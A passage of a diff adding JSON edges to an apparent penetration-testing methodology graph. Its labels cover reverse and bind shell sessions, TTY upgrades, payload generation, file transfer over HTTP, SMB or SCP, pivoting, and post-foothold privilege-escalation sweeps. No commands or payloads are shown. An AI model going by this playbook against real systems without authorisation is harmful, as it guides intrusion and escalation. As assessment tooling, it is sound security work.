+      "toNode": "method:session-proof:checks",
+      "toSide": "right",
+      "toEnd": "arrow",
+      "label": "validation commands"
+    },
+    {
+      "id": "method:session-proof:validate--enabled",
+      "fromNode": "method:session-proof:validate",
+      "fromSide": "right",
+      "toNode": "method:session-proof:enabled",
+      "toSide": "left",
+      "toEnd": "arrow",
+      "label": "Condition confirmed"
+    },
+    {
+      "id": "method:session-proof:validate--ruledout",
+      "fromNode": "method:session-proof:validate",
+      "fromSide": "right",
+      "toNode": "method:session-proof:ruledout",
+      "toSide": "left",
+      "toEnd": "arrow",
+      "label": "Condition disproved here"
+    },
+    {
+      "id": "method:session-proof:validate--unknown",
+      "fromNode": "method:session-proof:validate",
+      "fromSide": "right",
+      "toNode": "method:session-proof:unknown",
+      "toSide": "left",
+      "toEnd": "arrow",
+      "label": "Evidence inconclusive"
+    },
+    {
+      "id": "method:session-proof:enabled--action",
+      "fromNode": "method:session-proof:enabled",
+      "fromSide": "right",
+      "toNode": "method:session-proof:action",
+      "toSide": "left",
+      "toEnd": "arrow",
+      "label": "review the documented sequence"
+    },
+    {
+      "id": "method:session-proof:enabled--next-0",
+      "fromNode": "method:session-proof:enabled",
+      "fromSide": "right",
+      "toNode": "method:session-proof:next-0",
+      "toSide": "left",
+      "toEnd": "arrow",
+      "label": "Linux command execution exists but an interactive channel is needed"
+    },
+    {
+      "id": "method:session-proof:enabled--next-1",
+      "fromNode": "method:session-proof:enabled",
+      "fromSide": "right",
+      "toNode": "method:session-proof:next-1",
+      "toSide": "left",
+      "toEnd": "arrow",
+      "label": "A new Linux foothold or an identity/privilege change"
+    },
+    {
+      "id": "method:session-proof:enabled--next-2",
+      "fromNode": "method:session-proof:enabled",
+      "fromSide": "right",
+      "toNode": "method:session-proof:next-2",
+      "toSide": "left",
+      "toEnd": "arrow",
+      "label": "A new Windows session or claimed administrator/SYSTEM transition"
+    },
+    {
+      "id": "method:session-reverse:start--discover",
+      "fromNode": "method:session-reverse:start",
+      "fromSide": "right",
+      "toNode": "method:session-reverse:discover",
+      "toSide": "left",
+      "toEnd": "arrow",
+      "label": "inspect this surface"
+    },
+    {
+      "id": "method:session-reverse:discover--interpret",
+      "fromNode": "method:session-reverse:discover",
+      "fromSide": "right",
+      "toNode": "method:session-reverse:interpret",
+      "toSide": "left",
+      "toEnd": "arrow",
+      "label": "interpret the evidence"
+    },
+    {
+      "id": "method:session-reverse:interpret--validate",
+      "fromNode": "method:session-reverse:interpret",
+      "fromSide": "bottom",
+      "toNode": "method:session-reverse:validate",
+      "toSide": "top",
+      "toEnd": "arrow",
+      "label": "still check"
+    },
+    {
+      "id": "method:session-reverse:validate--enabled",
+      "fromNode": "method:session-reverse:validate",
+      "fromSide": "right",
+      "toNode": "method:session-reverse:enabled",
+      "toSide": "left",
+      "toEnd": "arrow",
+      "label": "Condition confirmed"
+    },
+    {
+      "id": "method:session-reverse:validate--ruledout",
+      "fromNode": "method:session-reverse:validate",
+      "fromSide": "right",
+      "toNode": "method:session-reverse:ruledout",
+      "toSide": "left",
+      "toEnd": "arrow",
+      "label": "Condition disproved here"
+    },
+    {
+      "id": "method:session-reverse:validate--unknown",
+      "fromNode": "method:session-reverse:validate",
+      "fromSide": "right",
+      "toNode": "method:session-reverse:unknown",
+      "toSide": "left",
+      "toEnd": "arrow",
+      "label": "Evidence inconclusive"
+    },
+    {
+      "id": "method:session-reverse:enabled--action",
+      "fromNode": "method:session-reverse:enabled",
+      "fromSide": "right",
+      "toNode": "method:session-reverse:action",
+      "toSide": "left",
+      "toEnd": "arrow",
+      "label": "review the documented sequence"
+    },
+    {
+      "id": "method:session-reverse:enabled--next-0",
+      "fromNode": "method:session-reverse:enabled",
+      "fromSide": "right",
+      "toNode": "method:session-reverse:next-0",
+      "toSide": "left",
+      "toEnd": "arrow",
+      "label": "A working shell lacks job control, terminal signals or interactive program support"
+    },
+    {
+      "id": "method:session-reverse:enabled--next-1",
+      "fromNode": "method:session-reverse:enabled",
+      "fromSide": "right",
+      "toNode": "method:session-reverse:next-1",
+      "toSide": "left",
+      "toEnd": "arrow",
+      "label": "Command execution or payload delivery exists but the expected usable channel does not"
+    },
+    {
+      "id": "method:session-reverse:enabled--next-2",
+      "fromNode": "method:session-reverse:enabled",
+      "fromSide": "right",
+      "toNode": "method:session-reverse:next-2",
+      "toSide": "left",
+      "toEnd": "arrow",
+      "label": "A tool/artifact must reach a target that can make an HTTP request"
+    },
+    {
+      "id": "method:session-reverse:enabled--next-3",
+      "fromNode": "method:session-reverse:enabled",
+      "fromSide": "right",
+      "toNode": "method:session-reverse:next-3",
+      "toSide": "left",
+      "toEnd": "arrow",
+      "label": "Reverse egress is unavailable but a target listener is reachable"
+    },
+    {
+      "id": "method:session-windows:start--discover",
+      "fromNode": "method:session-windows:start",
+      "fromSide": "right",
+      "toNode": "method:session-windows:discover",
+      "toSide": "left",
+      "toEnd": "arrow",
+      "label": "inspect this surface"
+    },
+    {
+      "id": "method:session-windows:discover--interpret",
+      "fromNode": "method:session-windows:discover",
+      "fromSide": "right",
+      "toNode": "method:session-windows:interpret",
+      "toSide": "left",
+      "toEnd": "arrow",
+      "label": "interpret the evidence"
+    },
+    {
+      "id": "method:session-windows:interpret--validate",
+      "fromNode": "method:session-windows:interpret",
+      "fromSide": "bottom",
+      "toNode": "method:session-windows:validate",
+      "toSide": "top",
+      "toEnd": "arrow",
+      "label": "still check"
+    },
+    {
+      "id": "method:session-windows:validate--checks",
+      "fromNode": "method:session-windows:validate",
+      "fromSide": "left",
+      "toNode": "method:session-windows:checks",
+      "toSide": "right",
+      "toEnd": "arrow",
+      "label": "validation commands"
+    },
+    {
+      "id": "method:session-windows:validate--enabled",
+      "fromNode": "method:session-windows:validate",
+      "fromSide": "right",
+      "toNode": "method:session-windows:enabled",
+      "toSide": "left",
+      "toEnd": "arrow",
+      "label": "Condition confirmed"
+    },
+    {
+      "id": "method:session-windows:validate--ruledout",
+      "fromNode": "method:session-windows:validate",
+      "fromSide": "right",
+      "toNode": "method:session-windows:ruledout",
+      "toSide": "left",
+      "toEnd": "arrow",
+      "label": "Condition disproved here"
+    },
+    {
+      "id": "method:session-windows:validate--unknown",
+      "fromNode": "method:session-windows:validate",
+      "fromSide": "right",
+      "toNode": "method:session-windows:unknown",
+      "toSide": "left",
+      "toEnd": "arrow",
+      "label": "Evidence inconclusive"
+    },
+    {
+      "id": "method:session-windows:enabled--action",
+      "fromNode": "method:session-windows:enabled",
+      "fromSide": "right",
+      "toNode": "method:session-windows:action",
+      "toSide": "left",
+      "toEnd": "arrow",
+      "label": "review the documented sequence"
+    },
+    {
+      "id": "method:session-windows:enabled--next-0",
+      "fromNode": "method:session-windows:enabled",
+      "fromSide": "right",
+      "toNode": "method:session-windows:next-0",
+      "toSide": "left",
+      "toEnd": "arrow",
+      "label": "A new Windows session or claimed administrator/SYSTEM transition"
+    },
+    {
+      "id": "method:session-windows:enabled--next-1",
+      "fromNode": "method:session-windows:enabled",
+      "fromSide": "right",
+      "toNode": "method:session-windows:next-1",
+      "toSide": "left",
+      "toEnd": "arrow",
+      "label": "A WinRM listener and a candidate endpoint-authorized account"
+    },
+    {
+      "id": "method:session-windows:enabled--next-2",
+      "fromNode": "method:session-windows:enabled",
+      "fromSide": "right",
+      "toNode": "method:session-windows:next-2",
+      "toSide": "left",
+      "toEnd": "arrow",
+      "label": "PowerShell reports scripts disabled, constrained syntax or an execution-control error"
+    },
+    {
+      "id": "method:session-bind:start--discover",
+      "fromNode": "method:session-bind:start",
+      "fromSide": "right",
+      "toNode": "method:session-bind:discover",
+      "toSide": "left",
+      "toEnd": "arrow",
+      "label": "inspect this surface"
+    },
+    {
+      "id": "method:session-bind:discover--interpret",
+      "fromNode": "method:session-bind:discover",
+      "fromSide": "right",
+      "toNode": "method:session-bind:interpret",
+      "toSide": "left",
+      "toEnd": "arrow",
+      "label": "interpret the evidence"
+    },
+    {
+      "id": "method:session-bind:interpret--validate",
+      "fromNode": "method:session-bind:interpret",
+      "fromSide": "bottom",
+      "toNode": "method:session-bind:validate",
+      "toSide": "top",
+      "toEnd": "arrow",
+      "label": "still check"
+    },
+    {
+      "id": "method:session-bind:validate--enabled",
+      "fromNode": "method:session-bind:validate",
+      "fromSide": "right",
+      "toNode": "method:session-bind:enabled",
+      "toSide": "left",
+      "toEnd": "arrow",
+      "label": "Condition confirmed"
+    },
+    {
+      "id": "method:session-bind:validate--ruledout",
+      "fromNode": "method:session-bind:validate",
+      "fromSide": "right",
+      "toNode": "method:session-bind:ruledout",
+      "toSide": "left",
+      "toEnd": "arrow",
+      "label": "Condition disproved here"
+    },
+    {
+      "id": "method:session-bind:validate--unknown",
+      "fromNode": "method:session-bind:validate",
+      "fromSide": "right",
+      "toNode": "method:session-bind:unknown",
+      "toSide": "left",
+      "toEnd": "arrow",
+      "label": "Evidence inconclusive"
+    },
+    {
+      "id": "method:session-bind:enabled--action",
+      "fromNode": "method:session-bind:enabled",
+      "fromSide": "right",
+      "toNode": "method:session-bind:action",
+      "toSide": "left",
+      "toEnd": "arrow",
+      "label": "review the documented sequence"
+    },
+    {
+      "id": "method:session-bind:enabled--next-0",
+      "fromNode": "method:session-bind:enabled",
+      "fromSide": "right",
+      "toNode": "method:session-bind:next-0",
+      "toSide": "left",
+      "toEnd": "arrow",
+      "label": "A working shell lacks job control, terminal signals or interactive program support"
+    },
+    {
+      "id": "method:session-bind:enabled--next-1",
+      "fromNode": "method:session-bind:enabled",
+      "fromSide": "right",
+      "toNode": "method:session-bind:next-1",
+      "toSide": "left",
+      "toEnd": "arrow",
+      "label": "One reachable pivot can connect to one internal TCP destination"
+    },
+    {
+      "id": "method:session-bind:enabled--next-2",
+      "fromNode": "method:session-bind:enabled",
+      "fromSide": "right",
+      "toNode": "method:session-bind:next-2",
+      "toSide": "left",
+      "toEnd": "arrow",
+      "label": "A PoC, injected command or remote client reports execution"
+    },
+    {
+      "id": "method:payload-generate:start--discover",
+      "fromNode": "method:payload-generate:start",
+      "fromSide": "right",
+      "toNode": "method:payload-generate:discover",
+      "toSide": "left",
+      "toEnd": "arrow",
+      "label": "inspect this surface"
+    },
+    {
+      "id": "method:payload-generate:discover--interpret",
+      "fromNode": "method:payload-generate:discover",
+      "fromSide": "right",
+      "toNode": "method:payload-generate:interpret",
+      "toSide": "left",
+      "toEnd": "arrow",
+      "label": "interpret the evidence"
+    },
+    {
+      "id": "method:payload-generate:interpret--validate",
+      "fromNode": "method:payload-generate:interpret",
+      "fromSide": "bottom",
+      "toNode": "method:payload-generate:validate",
+      "toSide": "top",
+      "toEnd": "arrow",
+      "label": "still check"
+    },
+    {
+      "id": "method:payload-generate:validate--checks",
+      "fromNode": "method:payload-generate:validate",
+      "fromSide": "left",
+      "toNode": "method:payload-generate:checks",
+      "toSide": "right",
+      "toEnd": "arrow",
+      "label": "validation commands"
+    },
+    {
+      "id": "method:payload-generate:validate--enabled",
+      "fromNode": "method:payload-generate:validate",
+      "fromSide": "right",
+      "toNode": "method:payload-generate:enabled",
+      "toSide": "left",
+      "toEnd": "arrow",
+      "label": "Condition confirmed"
+    },
+    {
+      "id": "method:payload-generate:validate--ruledout",
+      "fromNode": "method:payload-generate:validate",
+      "fromSide": "right",
+      "toNode": "method:payload-generate:ruledout",
+      "toSide": "left",
+      "toEnd": "arrow",
+      "label": "Condition disproved here"
+    },
+    {
+      "id": "method:payload-generate:validate--unknown",
+      "fromNode": "method:payload-generate:validate",
+      "fromSide": "right",
+      "toNode": "method:payload-generate:unknown",
+      "toSide": "left",
+      "toEnd": "arrow",
+      "label": "Evidence inconclusive"
+    },
+    {
+      "id": "method:payload-generate:enabled--action",
+      "fromNode": "method:payload-generate:enabled",
+      "fromSide": "right",
+      "toNode": "method:payload-generate:action",
+      "toSide": "left",
+      "toEnd": "arrow",
+      "label": "review the documented sequence"
+    },
+    {
+      "id": "method:payload-generate:enabled--next-0",
+      "fromNode": "method:payload-generate:enabled",
+      "fromSide": "right",
+      "toNode": "method:payload-generate:next-0",
+      "toSide": "left",
+      "toEnd": "arrow",
+      "label": "A downloaded/generated artifact exists but does not run"
+    },
+    {
+      "id": "method:payload-generate:enabled--next-1",
+      "fromNode": "method:payload-generate:enabled",
+      "fromSide": "right",
+      "toNode": "method:payload-generate:next-1",
+      "toSide": "left",
+      "toEnd": "arrow",
+      "label": "A payload connects without a session, or a handler/session exits unexpectedly"
+    },
+    {
+      "id": "method:payload-generate:enabled--next-2",
+      "fromNode": "method:payload-generate:enabled",
+      "fromSide": "right",
+      "toNode": "method:payload-generate:next-2",
+      "toSide": "left",
+      "toEnd": "arrow",
+      "label": "A PoC, injected command or remote client reports execution"
+    },
+    {
+      "id": "method:session-tty:start--discover",
+      "fromNode": "method:session-tty:start",
+      "fromSide": "right",
+      "toNode": "method:session-tty:discover",
+      "toSide": "left",
+      "toEnd": "arrow",
+      "label": "inspect this surface"
+    },
+    {
+      "id": "method:session-tty:discover--interpret",
+      "fromNode": "method:session-tty:discover",
+      "fromSide": "right",
+      "toNode": "method:session-tty:interpret",
+      "toSide": "left",
+      "toEnd": "arrow",
+      "label": "interpret the evidence"
+    },
+    {
+      "id": "method:session-tty:interpret--validate",
+      "fromNode": "method:session-tty:interpret",
+      "fromSide": "bottom",
+      "toNode": "method:session-tty:validate",
+      "toSide": "top",
+      "toEnd": "arrow",
+      "label": "still check"
+    },
+    {
+      "id": "method:session-tty:validate--enabled",
+      "fromNode": "method:session-tty:validate",
+      "fromSide": "right",
+      "toNode": "method:session-tty:enabled",
+      "toSide": "left",
+      "toEnd": "arrow",
+      "label": "Condition confirmed"
+    },
+    {
+      "id": "method:session-tty:validate--ruledout",
+      "fromNode": "method:session-tty:validate",
+      "fromSide": "right",
+      "toNode": "method:session-tty:ruledout",
+      "toSide": "left",
+      "toEnd": "arrow",
+      "label": "Condition disproved here"
+    },
+    {
+      "id": "method:session-tty:validate--unknown",
+      "fromNode": "method:session-tty:validate",
+      "fromSide": "right",
+      "toNode": "method:session-tty:unknown",
+      "toSide": "left",
+      "toEnd": "arrow",
+      "label": "Evidence inconclusive"
+    },
+    {
+      "id": "method:session-tty:enabled--action",
+      "fromNode": "method:session-tty:enabled",
+      "fromSide": "right",
+      "toNode": "method:session-tty:action",
+      "toSide": "left",
+      "toEnd": "arrow",
+      "label": "review the documented sequence"
+    },
+    {
+      "id": "method:session-tty:enabled--next-0",
+      "fromNode": "method:session-tty:enabled",
+      "fromSide": "right",
+      "toNode": "method:session-tty:next-0",
+      "toSide": "left",
+      "toEnd": "arrow",
+      "label": "sudo -l grants an operation under a more useful identity"
+    },
+    {
+      "id": "method:session-tty:enabled--next-1",
+      "fromNode": "method:session-tty:enabled",
+      "fromSide": "right",
+      "toNode": "method:session-tty:next-1",
+      "toSide": "left",
+      "toEnd": "arrow",
+      "label": "A new Linux foothold or an identity/privilege change"
+    },
+    {
+      "id": "method:session-tty:enabled--next-2",
+      "fromNode": "method:session-tty:enabled",
+      "fromSide": "right",
+      "toNode": "method:session-tty:next-2",
+      "toSide": "left",
+      "toEnd": "arrow",
+      "label": "An SSH service and a known password, private key or agent context"
+    },
+    {
+      "id": "method:transfer-http:start--discover",
+      "fromNode": "method:transfer-http:start",
+      "fromSide": "right",
+      "toNode": "method:transfer-http:discover",
+      "toSide": "left",
+      "toEnd": "arrow",
+      "label": "inspect this surface"
+    },
+    {
+      "id": "method:transfer-http:discover--interpret",
+      "fromNode": "method:transfer-http:discover",
+      "fromSide": "right",
+      "toNode": "method:transfer-http:interpret",
+      "toSide": "left",
+      "toEnd": "arrow",
+      "label": "interpret the evidence"
+    },
+    {
+      "id": "method:transfer-http:interpret--validate",
+      "fromNode": "method:transfer-http:interpret",
+      "fromSide": "bottom",
+      "toNode": "method:transfer-http:validate",
+      "toSide": "top",
+      "toEnd": "arrow",
+      "label": "still check"
+    },
+    {
+      "id": "method:transfer-http:validate--checks",
+      "fromNode": "method:transfer-http:validate",
+      "fromSide": "left",
+      "toNode": "method:transfer-http:checks",
+      "toSide": "right",
+      "toEnd": "arrow",
+      "label": "validation commands"
+    },
+    {
+      "id": "method:transfer-http:validate--enabled",
+      "fromNode": "method:transfer-http:validate",
+      "fromSide": "right",
+      "toNode": "method:transfer-http:enabled",
+      "toSide": "left",
+      "toEnd": "arrow",
+      "label": "Condition confirmed"
+    },
+    {
+      "id": "method:transfer-http:validate--ruledout",
+      "fromNode": "method:transfer-http:validate",
+      "fromSide": "right",
+      "toNode": "method:transfer-http:ruledout",
+      "toSide": "left",
+      "toEnd": "arrow",
+      "label": "Condition disproved here"
+    },
+    {
+      "id": "method:transfer-http:validate--unknown",
+      "fromNode": "method:transfer-http:validate",
+      "fromSide": "right",
+      "toNode": "method:transfer-http:unknown",
+      "toSide": "left",
+      "toEnd": "arrow",
+      "label": "Evidence inconclusive"
+    },
+    {
+      "id": "method:transfer-http:enabled--action",
+      "fromNode": "method:transfer-http:enabled",
+      "fromSide": "right",
+      "toNode": "method:transfer-http:action",
+      "toSide": "left",
+      "toEnd": "arrow",
+      "label": "review the documented sequence"
+    },
+    {
+      "id": "method:transfer-http:enabled--next-0",
+      "fromNode": "method:transfer-http:enabled",
+      "fromSide": "right",
+      "toNode": "method:transfer-http:next-0",
+      "toSide": "left",
+      "toEnd": "arrow",
+      "label": "A downloaded/generated artifact exists but does not run"
+    },
+    {
+      "id": "method:transfer-http:enabled--next-1",
+      "fromNode": "method:transfer-http:enabled",
+      "fromSide": "right",
+      "toNode": "method:transfer-http:next-1",
+      "toSide": "left",
+      "toEnd": "arrow",
+      "label": "A Linux foothold is available; run an early sweep for sudo rules, file capabilities, credentials and writable privileged paths"
+    },
+    {
+      "id": "method:transfer-http:enabled--next-2",
+      "fromNode": "method:transfer-http:enabled",
+      "fromSide": "right",
+      "toNode": "method:transfer-http:next-2",
+      "toSide": "left",
+      "toEnd": "arrow",
+      "label": "A Windows foothold is available; run winPEAS or a focused survey for service/task permissions, token privileges and credentials"
+    },
+    {
+      "id": "method:transfer-http:enabled--next-3",
+      "fromNode": "method:transfer-http:enabled",
+      "fromSide": "right",
+      "toNode": "method:transfer-http:next-3",
+      "toSide": "left",
+      "toEnd": "arrow",
+      "label": "A Windows source can reach a temporary assessment-side SMB service"
+    },
+    {
+      "id": "method:transfer-http:enabled--next-4",
+      "fromNode": "method:transfer-http:enabled",
+      "fromSide": "right",
+      "toNode": "method:transfer-http:next-4",
+      "toSide": "left",
+      "toEnd": "arrow",
+      "label": "Only a raw TCP tool and a direct or forwarded connection are available"
+    },
+    {
+      "id": "method:transfer-http:enabled--next-5",
+      "fromNode": "method:transfer-http:enabled",
+      "fromSide": "right",
+      "toNode": "method:transfer-http:next-5",
+      "toSide": "left",
+      "toEnd": "arrow",
+      "label": "The existing command channel permits text but no convenient file-transfer connection"
+    },
+    {
+      "id": "method:transfer-http:enabled--next-6",
+      "fromNode": "method:transfer-http:enabled",
+      "fromSide": "right",
+      "toNode": "method:transfer-http:next-6",
+      "toSide": "left",
+      "toEnd": "arrow",
+      "label": "The target has an FTP client and simpler transfer routes are unavailable"
+    },
+    {
+      "id": "method:transfer-scp:start--discover",
+      "fromNode": "method:transfer-scp:start",
+      "fromSide": "right",
+      "toNode": "method:transfer-scp:discover",
+      "toSide": "left",
+      "toEnd": "arrow",
+      "label": "inspect this surface"
+    },
+    {
+      "id": "method:transfer-scp:discover--interpret",
+      "fromNode": "method:transfer-scp:discover",
+      "fromSide": "right",
+      "toNode": "method:transfer-scp:interpret",
+      "toSide": "left",
+      "toEnd": "arrow",
+      "label": "interpret the evidence"
+    },
+    {
+      "id": "method:transfer-scp:interpret--validate",
+      "fromNode": "method:transfer-scp:interpret",
+      "fromSide": "bottom",
+      "toNode": "method:transfer-scp:validate",
+      "toSide": "top",
+      "toEnd": "arrow",
+      "label": "still check"
+    },
+    {
+      "id": "method:transfer-scp:validate--checks",
+      "fromNode": "method:transfer-scp:validate",
+      "fromSide": "left",
+      "toNode": "method:transfer-scp:checks",
+      "toSide": "right",
+      "toEnd": "arrow",
+      "label": "validation commands"
+    },
+    {
+      "id": "method:transfer-scp:validate--enabled",
+      "fromNode": "method:transfer-scp:validate",
+      "fromSide": "right",
+      "toNode": "method:transfer-scp:enabled",
+      "toSide": "left",
+      "toEnd": "arrow",
+      "label": "Condition confirmed"
+    },
+    {
+      "id": "method:transfer-scp:validate--ruledout",
+      "fromNode": "method:transfer-scp:validate",
+      "fromSide": "right",
+      "toNode": "method:transfer-scp:ruledout",
+      "toSide": "left",
+      "toEnd": "arrow",
+      "label": "Condition disproved here"
+    },
+    {
+      "id": "method:transfer-scp:validate--unknown",
+      "fromNode": "method:transfer-scp:validate",
+      "fromSide": "right",
+      "toNode": "method:transfer-scp:unknown",
+      "toSide": "left",
+      "toEnd": "arrow",
+      "label": "Evidence inconclusive"
+    },
+    {
+      "id": "method:transfer-scp:enabled--action",
+      "fromNode": "method:transfer-scp:enabled",
+      "fromSide": "right",
+      "toNode": "method:transfer-scp:action",
+      "toSide": "left",
+      "toEnd": "arrow",
+      "label": "review the documented sequence"
+    },
+    {
+      "id": "method:transfer-scp:enabled--next-0",
+      "fromNode": "method:transfer-scp:enabled",
+      "fromSide": "right",
+      "toNode": "method:transfer-scp:next-0",
+      "toSide": "left",
+      "toEnd": "arrow",
+      "label": "A downloaded/generated artifact exists but does not run"
+    },
+    {
+      "id": "method:transfer-scp:enabled--next-1",
+      "fromNode": "method:transfer-scp:enabled",
+      "fromSide": "right",
+      "toNode": "method:transfer-scp:next-1",
+      "toSide": "left",
+      "toEnd": "arrow",
+      "label": "A tool/artifact must reach a target that can make an HTTP request"
+    },
+    {
+      "id": "method:transfer-scp:enabled--next-2",
+      "fromNode": "method:transfer-scp:enabled",
+      "fromSide": "right",
+      "toNode": "method:transfer-scp:next-2",
+      "toSide": "left",
+      "toEnd": "arrow",
+      "label": "An SSH service and a known password, private key or agent context"
+    },
+    {
+      "id": "method:transfer-smb:start--discover",
+      "fromNode": "method:transfer-smb:start",
+      "fromSide": "right",
+      "toNode": "method:transfer-smb:discover",
+      "toSide": "left",
+      "toEnd": "arrow",
+      "label": "inspect this surface"
+    },
+    {
+      "id": "method:transfer-smb:discover--interpret",
+      "fromNode": "method:transfer-smb:discover",
+      "fromSide": "right",
+      "toNode": "method:transfer-smb:interpret",
+      "toSide": "left",
+      "toEnd": "arrow",
+      "label": "interpret the evidence"
+    },
+    {
+      "id": "method:transfer-smb:interpret--validate",
+      "fromNode": "method:transfer-smb:interpret",
+      "fromSide": "bottom",
+      "toNode": "method:transfer-smb:validate",
+      "toSide": "top",
+      "toEnd": "arrow",
+      "label": "still check"
+    },
+    {
+      "id": "method:transfer-smb:validate--checks",
+      "fromNode": "method:transfer-smb:validate",
+      "fromSide": "left",
+      "toNode": "method:transfer-smb:checks",
+      "toSide": "right",
+      "toEnd": "arrow",
+      "label": "validation commands"
+    },
+    {
+      "id": "method:transfer-smb:validate--enabled",
+      "fromNode": "method:transfer-smb:validate",
+      "fromSide": "right",
+      "toNode": "method:transfer-smb:enabled",
+      "toSide": "left",
+      "toEnd": "arrow",
+      "label": "Condition confirmed"
+    },
+    {
+      "id": "method:transfer-smb:validate--ruledout",
+      "fromNode": "method:transfer-smb:validate",
+      "fromSide": "right",
+      "toNode": "method:transfer-smb:ruledout",
+      "toSide": "left",
+      "toEnd": "arrow",
+      "label": "Condition disproved here"
+    },
+    {
+      "id": "method:transfer-smb:validate--unknown",
+      "fromNode": "method:transfer-smb:validate",
+      "fromSide": "right",
+      "toNode": "method:transfer-smb:unknown",
+      "toSide": "left",
+      "toEnd": "arrow",
+      "label": "Evidence inconclusive"
+    },
+    {
+      "id": "method:transfer-smb:enabled--action",
+      "fromNode": "method:transfer-smb:enabled",
+      "fromSide": "right",
+      "toNode": "method:transfer-smb:action",
+      "toSide": "left",
+      "toEnd": "arrow",
+      "label": "review the documented sequence"
+    },
+    {
+      "id": "method:transfer-smb:enabled--next-0",
+      "fromNode": "method:transfer-smb:enabled",
+      "fromSide": "right",
+      "toNode": "method:transfer-smb:next-0",
+      "toSide": "left",
+      "toEnd": "arrow",
+      "label": "A downloaded/generated artifact exists but does not run"
+    },
+    {
+      "id": "method:transfer-smb:enabled--next-1",
+      "fromNode": "method:transfer-smb:enabled",
+      "fromSide": "right",
+      "toNode": "method:transfer-smb:next-1",
+      "toSide": "left",
+      "toEnd": "arrow",
+      "label": "A Windows foothold is available; run winPEAS or a focused survey for service/task permissions, token privileges and credentials"
+    },
+    {
+      "id": "method:transfer-smb:enabled--next-2",
+      "fromNode": "method:transfer-smb:enabled",
+      "fromSide": "right",
+      "toNode": "method:transfer-smb:next-2",
+      "toSide": "left",
+      "toEnd": "arrow",
+      "label": "A tool/artifact must reach a target that can make an HTTP request"
+    },
+    {
+      "id": "method:transfer-stream:start--discover",
+      "fromNode": "method:transfer-stream:start",
+      "fromSide": "right",
+      "toNode": "method:transfer-stream:discover",
+      "toSide": "left",
+      "toEnd": "arrow",
+      "label": "inspect this surface"
+    },
+    {
+      "id": "method:transfer-stream:discover--interpret",
+      "fromNode": "method:transfer-stream:discover",
+      "fromSide": "right",
+      "toNode": "method:transfer-stream:interpret",
+      "toSide": "left",
+      "toEnd": "arrow",
+      "label": "interpret the evidence"
+    },
+    {
+      "id": "method:transfer-stream:interpret--validate",
+      "fromNode": "method:transfer-stream:interpret",
+      "fromSide": "bottom",
+      "toNode": "method:transfer-stream:validate",
+      "toSide": "top",
+      "toEnd": "arrow",
+      "label": "still check"
+    },
+    {
+      "id": "method:transfer-stream:validate--checks",
+      "fromNode": "method:transfer-stream:validate",
+      "fromSide": "left",
+      "toNode": "method:transfer-stream:checks",
+      "toSide": "right",
+      "toEnd": "arrow",
+      "label": "validation commands"
+    },
+    {
+      "id": "method:transfer-stream:validate--enabled",
+      "fromNode": "method:transfer-stream:validate",
+      "fromSide": "right",
+      "toNode": "method:transfer-stream:enabled",
+      "toSide": "left",
+      "toEnd": "arrow",
+      "label": "Condition confirmed"
+    },
+    {
+      "id": "method:transfer-stream:validate--ruledout",
+      "fromNode": "method:transfer-stream:validate",
+      "fromSide": "right",
+      "toNode": "method:transfer-stream:ruledout",
+      "toSide": "left",
+      "toEnd": "arrow",
+      "label": "Condition disproved here"
+    },
+    {
+      "id": "method:transfer-stream:validate--unknown",
+      "fromNode": "method:transfer-stream:validate",
+      "fromSide": "right",
+      "toNode": "method:transfer-stream:unknown",
+      "toSide": "left",
+      "toEnd": "arrow",
+      "label": "Evidence inconclusive"
+    },
+    {
+      "id": "method:transfer-stream:enabled--action",
+      "fromNode": "method:transfer-stream:enabled",
+      "fromSide": "right",
+      "toNode": "method:transfer-stream:action",
+      "toSide": "left",
+      "toEnd": "arrow",
+      "label": "review the documented sequence"
+    },
+    {
+      "id": "method:transfer-stream:enabled--next-0",
+      "fromNode": "method:transfer-stream:enabled",
+      "fromSide": "right",
+      "toNode": "method:transfer-stream:next-0",
+      "toSide": "left",
+      "toEnd": "arrow",
+      "label": "A downloaded/generated artifact exists but does not run"
+    },
+    {
+      "id": "method:transfer-stream:enabled--next-1",
+      "fromNode": "method:transfer-stream:enabled",
+      "fromSide": "right",
+      "toNode": "method:transfer-stream:next-1",
+      "toSide": "left",
+      "toEnd": "arrow",
+      "label": "A tool/artifact must reach a target that can make an HTTP request"
+    },
+    {
+      "id": "method:transfer-stream:enabled--next-2",
+      "fromNode": "method:transfer-stream:enabled",
+      "fromSide": "right",
+      "toNode": "method:transfer-stream:next-2",
+      "toSide": "left",
+      "toEnd": "arrow",
+      "label": "One reachable pivot can connect to one internal TCP destination"
+    },
+    {
+      "id": "method:transfer-text:start--discover",
+      "fromNode": "method:transfer-text:start",
+      "fromSide": "right",
+      "toNode": "method:transfer-text:discover",
+      "toSide": "left",
+      "toEnd": "arrow",
+      "label": "inspect this surface"
+    },
+    {
+      "id": "method:transfer-text:discover--interpret",
+      "fromNode": "method:transfer-text:discover",
+      "fromSide": "right",
+      "toNode": "method:transfer-text:interpret",
+      "toSide": "left",
+      "toEnd": "arrow",
+      "label": "interpret the evidence"
+    },
+    {
+      "id": "method:transfer-text:interpret--validate",
+      "fromNode": "method:transfer-text:interpret",
+      "fromSide": "bottom",
+      "toNode": "method:transfer-text:validate",
+      "toSide": "top",
+      "toEnd": "arrow",
+      "label": "still check"
+    },
+    {
+      "id": "method:transfer-text:validate--checks",
+      "fromNode": "method:transfer-text:validate",
+      "fromSide": "left",
+      "toNode": "method:transfer-text:checks",
+      "toSide": "right",
+      "toEnd": "arrow",
+      "label": "validation commands"
+    },
+    {
+      "id": "method:transfer-text:validate--enabled",
+      "fromNode": "method:transfer-text:validate",
+      "fromSide": "right",
+      "toNode": "method:transfer-text:enabled",
+      "toSide": "left",
+      "toEnd": "arrow",
+      "label": "Condition confirmed"
+    },
+    {
+      "id": "method:transfer-text:validate--ruledout",
+      "fromNode": "method:transfer-text:validate",
+      "fromSide": "right",
+      "toNode": "method:transfer-text:ruledout",
+      "toSide": "left",
+      "toEnd": "arrow",
+      "label": "Condition disproved here"
+    },
+    {
+      "id": "method:transfer-text:validate--unknown",
+      "fromNode": "method:transfer-text:validate",
+      "fromSide": "right",
+      "toNode": "method:transfer-text:unknown",
+      "toSide": "left",
+      "toEnd": "arrow",
+      "label": "Evidence inconclusive"
+    },
+    {
+      "id": "method:transfer-text:enabled--action",
+      "fromNode": "method:transfer-text:enabled",
+      "fromSide": "right",
+      "toNode": "method:transfer-text:action",
+      "toSide": "left",
+      "toEnd": "arrow",
+      "label": "review the documented sequence"
+    },
+    {
+      "id": "method:transfer-text:enabled--next-0",
+      "fromNode": "method:transfer-text:enabled",
+      "fromSide": "right",
+      "toNode": "method:transfer-text:next-0",
+      "toSide": "left",
